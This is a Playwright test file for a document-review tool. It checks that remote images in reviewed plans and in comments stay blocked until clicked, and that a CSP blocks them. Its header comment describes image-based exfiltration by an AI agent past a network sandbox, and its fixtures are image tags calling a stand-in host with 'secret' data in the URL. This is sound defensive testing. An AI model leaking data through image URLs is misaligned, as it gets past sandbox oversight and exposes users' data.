import { test, expect, type APIRequestContext, type Page } from '@playwright/test';
import * as fs from 'fs';
import * as path from 'path';
import { addComment, clearAllComments, loadPage, mdSection, roundComplete, sessionCwd } from './helpers';

// Remote images in a reviewed document or a comment must not load until the
// reviewer clicks them: an agent could encode data in the URL (security
// report: image-based exfiltration past a network sandbox). The fixture has
// no remote_images config, so every remote host is blocked.

const REMOTE_HOST = 'remote-images.test';
const MD_IMAGE = `![Status badge](https://${REMOTE_HOST}/md.png?d=secret-md)`;
const RAW_IMAGE = `<img src="https://${REMOTE_HOST}/raw.png?d=secret-raw" alt="Raw image" width="40" height="20">`;
const PICTURE = `<picture><source srcset="https://${REMOTE_HOST}/source.png?d=secret-source"><img src="https://${REMOTE_HOST}/fallback.png?d=secret-fallback" alt="Picture image"></picture>`;
// 40x20 PNG.
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAACgAAAAUCAIAAABwJOjsAAAAGklEQVR42u3BAQ0AAADCoPdPbQ8HFAAAAMB3DxQAAQq3iQAAAAAASUVORK5CYII=',
  'base64',
);

let planPath: string;
let originalPlan: string;

test.beforeAll(async ({ request }) => {
  planPath = path.join(await sessionCwd(request), 'plan.md');
  originalPlan = fs.readFileSync(planPath, 'utf-8');
});

test.afterAll(async ({ request }) => {
  fs.writeFileSync(planPath, originalPlan);
  await roundComplete(request);
});

async function writePlan(request: APIRequestContext, extra: string) {
  fs.writeFileSync(planPath, originalPlan + '\n\n## Remote images\n\n' + extra + '\n');
  await expect.poll(async () => {
    const file = await (await request.get('/api/file?path=plan.md')).json();
    return file.content as string;
  }, { timeout: 5000 }).toContain(extra);
  await roundComplete(request);
}

// Requests to the remote host, and any CSP violation the page logs.
function watch(page: Page) {
  const remoteRequests: string[] = [];
  const cspErrors: string[] = [];
  page.on('request', req => {
    if (new URL(req.url()).hostname === REMOTE_HOST) remoteRequests.push(req.url());
  });
  page.on('console', msg => {
    if (/Content Security Policy/i.test(msg.text())) cspErrors.push(msg.text());
  });
  return { remoteRequests, cspErrors };
}

test.describe('Remote images — click to load', () => {
  test.beforeEach(async ({ request }) => {
    await clearAllComments(request);
  });

  test('document images become placeholders and fetch nothing', async ({ page, request }) => {
    await writePlan(request, MD_IMAGE + '\n\n' + RAW_IMAGE + '\n\n' + PICTURE);
    const seen = watch(page);
    await loadPage(page);
    const section = await mdSection(page);

    const placeholders = section.locator('.crit-remote-image');
    await expect(placeholders).toHaveCount(3);
    await expect(section.getByRole('button', { name: /Load remote image "Status badge" from remote-images\.test/ })).toBeVisible();
    await expect(section.locator(`img[src*="${REMOTE_HOST}"], source[srcset*="${REMOTE_HOST}"]`)).toHaveCount(0);

    // Nothing was requested, and the page itself never tripped the CSP.
    expect(seen.remoteRequests).toEqual([]);
    expect(seen.cspErrors).toEqual([]);
  });

  test('clicking a placeholder loads the image in a sandboxed frame', async ({ page, request }) => {
    await writePlan(request, MD_IMAGE);
    const seen = watch(page);
    await page.route(`https://${REMOTE_HOST}/**`, route => route.fulfill({ contentType: 'image/png', body: PNG }));
    await loadPage(page);
    const section = await mdSection(page);

    await section.getByRole('button', { name: /Load remote image "Status badge"/ }).click();
    const frame = section.locator('iframe.crit-remote-image-frame');
    await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
    await expect(frame).toHaveAttribute('referrerpolicy', 'no-referrer');
    // The frame reports the image size and the page sizes the frame to it.
    await expect.poll(() => frame.evaluate(el => Math.round(el.getBoundingClientRect().width))).toBe(40);
    await expect.poll(() => frame.evaluate(el => Math.round(el.getBoundingClientRect().height))).toBe(20);
    expect(seen.remoteRequests).toEqual([`https://${REMOTE_HOST}/md.png?d=secret-md`]);
    // Clicking did not open a comment form on the line.
    await expect(page.locator('.comment-form')).toHaveCount(0);
  });

  test('a failed load says so and links to the image', async ({ page, request }) => {
    await writePlan(request, MD_IMAGE);
    await page.route(`https://${REMOTE_HOST}/**`, route => route.abort());
    await loadPage(page);
    const section = await mdSection(page);

    await section.getByRole('button', { name: /Load remote image "Status badge"/ }).click();
    const error = section.locator('.crit-remote-image-error');
    await expect(error).toContainText(`Couldn’t load image from ${REMOTE_HOST}`);
    await expect(error.getByRole('link', { name: 'Open in a new tab' }))
      .toHaveAttribute('href', `https://${REMOTE_HOST}/md.png?d=secret-md`);
  });

  test('comment images become placeholders', async ({ page, request }) => {
    await writePlan(request, 'Plain text.');
    await addComment(request, 'plan.md', 1,
      `See ![Agent image](https://${REMOTE_HOST}/comment.png?d=secret-comment) and <img src="https://${REMOTE_HOST}/comment-raw.png">`);
    const seen = watch(page);
    await loadPage(page);
    const section = await mdSection(page);

    const body = section.locator('.comment-body').first();
    await expect(body.locator('.crit-remote-image')).toHaveCount(2);
    await expect(body.locator(`img[src*="${REMOTE_HOST}"]`)).toHaveCount(0);
    expect(seen.remoteRequests).toEqual([]);
    expect(seen.cspErrors).toEqual([]);
  });

  test('the review page sends a CSP that blocks remote images', async ({ request }) => {
    const res = await request.get('/');
    const policy = res.headers()['content-security-policy'] || '';
    expect(policy).toContain("img-src 'self' data: blob:;");
    expect(policy).toContain("connect-src 'self'");
  });
});
